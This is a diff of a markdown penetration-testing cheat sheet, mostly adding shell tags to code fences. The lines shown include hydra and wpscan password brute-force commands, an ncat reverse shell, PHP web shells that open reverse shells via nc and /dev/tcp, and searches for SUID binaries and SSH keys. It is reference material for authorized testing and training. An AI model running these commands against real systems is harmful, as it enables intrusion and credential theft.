@@ -37,41 +37,45 @@
 
 Make sure there are no maximum number of login attempts. To perform a manual check.
 
-#### IMAP
-```
+IMAP
+
+```shell
 hydra -L usernames.txt -P wordlists.txt -s 143 -f 192.168.0.1 imap
 ```
 
-#### PostgreSQL
+PostgreSQL
 
-```
+```shell
 hydra -l <username> -P /usr/share/wordlists/rockyou.txt 192.168.121.60 postgres
 ```
 
 for normal connection
 
-```
+```shell
 psql -U <username> -p 5432 -h <hostname or ip>
 ```
 
-#### HTTP Basic Authentication 
+HTTP Basic Authentication 
 
-```
+```shell
 hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.0.1 http-get /      # (/):default 
 ```
 
-#### JSON
+JSON
 
-```
-#Content-Type、Accept、Origin、X-Requested-With、Referer and CSRF checks、Cookies
-#use cURL to check necessary headers
+```shell
+# Content-Type、Accept、Origin、X-Requested-With、Referer and CSRF checks、Cookies
+# use cURL to check necessary headers
 hydra -l admin -P ~/Documents/rockyou.txt test.com https-post-form "/login:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:F=401:H=Origin\: https\://test.com:H=Accept\: application/json, text/plain, */*:H=Content-Type\: application/json;charset=utf-8"
 ```
 
 ### :open_file_folder: cewl
 
-```
+get a list for password crackers
+
+```shell
 cewl -d 4 https://192.168.0.1 -w /tmp/wordlists.txt
+# -d depth 
 ```
 
 ### :open_file_folder: nmap
@@ -80,20 +84,20 @@ cewl -d 4 https://192.168.0.1 -w /tmp/wordlists.txt
 
 scan a subnet
 
-```
+```shell
 # Note that if set too fast may affect the results
 nmap -T3 192.168.10.0/24
 ```
 
 scan all TCP ports and services
 
-```
+```shell
 nmap -Pn -p- -sC -sV -T4 <target ip>
 ```
 
 optimizing performance
 
-```
+```shell
 nmap -p- --min-rate 1000 <target ip>
 # --min-rate <number>: Send packets no slower than <number> per second
 # and then specific port
@@ -104,7 +108,7 @@ nmap -p <target port> -sC -sV <target ip>
 
 ncat 
 
-```
+```shell
 ncat -e /bin/bash 192.168.10.58 8080
 ```
 
@@ -157,19 +161,21 @@ php(file)
 <?php system(\"nc -e /bin/bash 192.168.1.100 80\"); ?>
 ```
 
-```
+```Php
 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.30/80 0>&1'");?>
 ```
 
 ### :open_file_folder: Cron jobs
 
-```
+```shell
 crontab -l
 ```
-```
+
+```shell
 ls -alh /etc/cron.* /etc/at*
 ```
-```
+
+```shell
 cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
 ```
 
@@ -181,53 +187,53 @@ unprivileged Linux process snooping: [pspy](https://github.com/DominicBreuker/ps
 
 Finding application
 
-```
+```shell
 wpscan --url http://192.168.0.1/
 ```
 
 Enumerating valid usernames
 
-```
+```shell
 wpscan --url http://192.168.0.1/ --enumerate u1-1000
 ```
 
 Enumerating themes
 
-```
+```shell
 wpscan --url http://192.168.0.1/ -e at
 ```
 
-```
+```shell
 curl -k -s http://192.168.0.1/wp-content/themes/ | html2text
 ```
 
-```
+```shell
 curl -s -X GET http://192.168.0.1 | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
 ```
 
 Enumerating plugins
 
-```
+```shell
 wpscan --url http://192.168.0.1/ -e ap
 ```
 
-```
+```shell
 curl -k -s http://192.168.0.1/wp-content/plugins/ | html2text
 ```
 
-```
+```shell
 curl -s -X GET http://192.168.0.1 | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
 ```
 
 Brute-force attack
 
-```
+```shell
 wpscan --url http://192.168.0.1/ --passwords /usr/share/wordlists/rockyou.txt --max-threads 50 --usernames admin
 ```
 
 SSL peer certificate or SSH remote key was not OK
 
-```
+```shell
 wpscan --url https://192.168.0.1/ --disable-tls-checks
 ```
 
@@ -251,19 +257,19 @@ find / -name *kali* 2>&-
 
 ### :open_file_folder: AutoRecon
 
-```
+```shell
 git clone https://github.com/Tib3rius/AutoRecon.git
 
 cd AutoRecon
 
-sudo python3 autorecon.py <target IP> --dirbuster.wordlist "" #skip directory busting to speed up results
+sudo python3 autorecon.py <target IP> --dirbuster.wordlist "" # skip directory busting to speed up results
 ```
 
 ### :open_file_folder: Wfuzz
 
 find subdomains
 
-```
+```shell
 # hw:hide responses
 wfuzz -H 'Host: FUZZ.test.com' -u http://test.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hw 407
 ```
@@ -272,7 +278,7 @@ wfuzz -H 'Host: FUZZ.test.com' -u http://test.com -w /usr/share/seclists/Discove
 
 create new password list
 
-```
+```shell
 echo -n "passwordstring" > /tmp/oldPass
 # -n: do not output the trailing newline
 
@@ -302,7 +308,7 @@ find / -type f \( -iname \*.php -o -iname \*.config -o -iname \*.conf -o -iname 
 
 finding SUID executables
 
-```
+```shell
 find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
 find / -uid 0 -perm -4000 -type f 2>/dev/null
 find / -perm -u=s -type f 2>/dev/null
@@ -313,7 +319,7 @@ find / -user root -perm -4000 -exec ls -ldb {} \;
 
 find ssh key
 
-```
+```shell
 find / -type f -name id_rsa* 2>&-
 ```
 
